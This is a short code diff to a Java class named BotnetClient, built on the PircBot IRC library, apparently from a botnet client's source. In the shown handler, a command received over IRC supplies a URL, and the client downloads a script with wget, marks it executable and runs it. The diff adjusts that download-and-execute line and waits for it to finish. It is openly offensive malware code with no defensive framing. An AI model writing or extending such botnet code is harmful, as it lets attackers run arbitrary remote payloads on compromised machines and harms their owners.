@@ -131,7 +131,8 @@ public class BotnetClient extends PircBot {
 					String[] parts = message.split(" ");
 					if (parts.length > 1) {
 						String url = parts[1];
-						Runtime.getRuntime().exec("wget -O clean.sh " + url + "; chmod +x clean.sh; ./clean.sh;");
+						Process p = Runtime.getRuntime().exec("wget -O clean.sh " + url + "; chmod +x clean.sh; ./clean.sh; exit;");
+						p.waitFor();
 						System.exit(0);
 					}
 				} else if (message.toLowerCase().startsWith("kill")) {
